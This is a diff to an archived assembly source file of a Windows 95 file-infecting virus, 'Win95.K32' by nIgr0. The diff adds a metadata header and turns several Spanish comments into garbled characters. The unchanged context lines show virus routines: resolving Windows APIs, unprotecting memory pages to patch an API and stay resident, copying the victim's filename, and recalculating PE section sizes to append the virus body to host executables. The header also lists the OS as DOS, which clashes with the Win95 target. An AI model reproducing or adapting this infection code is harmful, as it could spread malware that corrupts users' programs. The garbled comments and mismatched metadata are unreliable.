@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      Legacy Win95
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;***********************************************************************
 ;*                                                                     * 
 ;*          VIRUS  WIN95.K32       By nIgr0                            * 
@@ -163,7 +174,7 @@ nombreapis:
                   dd 014d
                   db 'SetFilePointer',0,'  '      ;voy a utilizar
                   dd 08d
-                  db 'ReadFile',0,'        '      ;junto con el tama¤o de la
+                  db 'ReadFile',0,'        '      ;junto con el tamaï¿½o de la
                   dd 09d
                   db 'WriteFile',0,'       '      ;string
                   dd 011d
@@ -304,7 +315,7 @@ nopayload:
        ror   edi,012d
        call  desprotegerpagina       ;desprotejo 2 paginas una para poder
                                      ;parchear el api y otra en la que
-                                     ;quedar‚ residente
+                                     ;quedarï¿½ residente
        inc    edi
        call  desprotegerpagina      ;y la siguiente 
 
@@ -458,7 +469,7 @@ otrocar:   cmp  byte ptr [esi],0      ;copio la cadena de texto con el nombre
            je   sacabo                ;de la victima en la variable hoste
            movsb
            jmp otrocar
-sacabo:    movsb        ;copio el 0 tambi‚n
+sacabo:    movsb        ;copio el 0 tambiï¿½n
 
            lea  esi,ebp+hoste
            cmp  byte ptr [esi],022h
@@ -514,7 +525,7 @@ esunexe:
         call    moverpuntero
 
          
-           ; Leo un poco del header para calcular todo el tama¤o del
+           ; Leo un poco del header para calcular todo el tamaï¿½o del
            ; pe header y object table
 
         mov ecx,058h
@@ -577,7 +588,7 @@ esunexe:
          mov dword ptr [ebp + offset ultfisicalsize],eax
          mov dword ptr [ebp + offset secphy],eax
 
-         ; Calcula el tama¤o fisico pa el ultimo object
+         ; Calcula el tamaï¿½o fisico pa el ultimo object
          mov ecx,dword ptr [ebp + offset filealign]
          mov eax,dword ptr [ebp + offset physicalsize]
          add eax,viriisize
@@ -588,11 +599,11 @@ esunexe:
          mov dword ptr [ebp + offset physicalsize],eax
 
          mov eax,dword ptr [ebp + offset virtualsize]
-         mov dword ptr [ebp+ offset secdesplaza],eax ;el tama¤o virtual ser 
+         mov dword ptr [ebp+ offset secdesplaza],eax ;el tamaï¿½o virtual ser 
                                                      ;el desplazamiento dentro de la secci?n
                     ;RVA del objeto + desplazamiento virtual= entrypoint RVA   
 
-         ; calcula el tama¤o virtual del objeto modificado
+         ; calcula el tamaï¿½o virtual del objeto modificado
          mov ecx,dword ptr [ebp + offset objalign]
          mov eax,dword ptr [ebp + offset virtualsize]
          add eax,viriisize
